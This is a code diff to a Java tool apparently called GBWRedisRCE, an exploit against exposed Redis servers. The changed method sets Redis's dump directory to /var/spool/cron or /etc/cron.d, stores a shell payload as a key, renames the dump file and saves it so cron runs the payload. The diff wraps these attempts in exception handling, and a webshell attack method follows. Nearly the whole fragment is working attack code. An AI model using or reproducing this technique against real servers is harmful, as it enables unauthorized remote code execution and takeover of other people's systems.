@@ -96,28 +96,34 @@ public class GBWRedisRCE {
         prepare(jedis);
 
         /*try to write /var/spool/cron*/
-        printCmd("config set dir /var/spool/cron",jedis.configSet("dir","/var/spool/cron"));
-        printCmd("set x "+shell,jedis.set("x",shell));
-        printCmd("config set dbfilename root",jedis.configSet("dbfilename","root"));
-
-        String res = jedis.save();
-        printCmd("save",res);
-        if(res.toLowerCase().contains("ok"))
+        try {
+            printCmd("config set dir /var/spool/cron",jedis.configSet("dir","/var/spool/cron"));
+            printCmd("set x "+shell,jedis.set("x",shell));
+            printCmd("config set dbfilename root",jedis.configSet("dbfilename","root"));
+            String res = jedis.save();
+            printCmd("save",res);
             return;
+        }catch (Exception e){
+
+        }
 
         /*try to write redis*/
-        printCmd("config set dbfilename redis",jedis.configSet("dbfilename","redis"));
-        res = jedis.save();
-        printCmd("save",res);
-        if(res.toLowerCase().contains("ok"))
+        try {
+            printCmd("config set dir /var/spool/cron",jedis.configSet("dir","/var/spool/cron"));
+            printCmd("set x "+shell,jedis.set("x",shell));
+            printCmd("config set dbfilename redis",jedis.configSet("dbfilename","redis"));
+            String res = jedis.save();
+            printCmd("save",res);
             return;
+        }catch (Exception e){
 
+        }
+        
         /*try to write to /etc/cron.d/redis*/
         printCmd("config set dir /etc/cron.d",jedis.configSet("dir","/etc/cron.d"));
         printCmd("set x "+shell,jedis.set("x",shell));
         printCmd("config set dbfilename redis",jedis.configSet("dbfilename","redis"));
-        res = jedis.save();
-        printCmd("save",res);
+        printCmd("save",jedis.save());
     }
 
     private static void runWebshellAttack(Jedis jedis,String args) throws Exception {
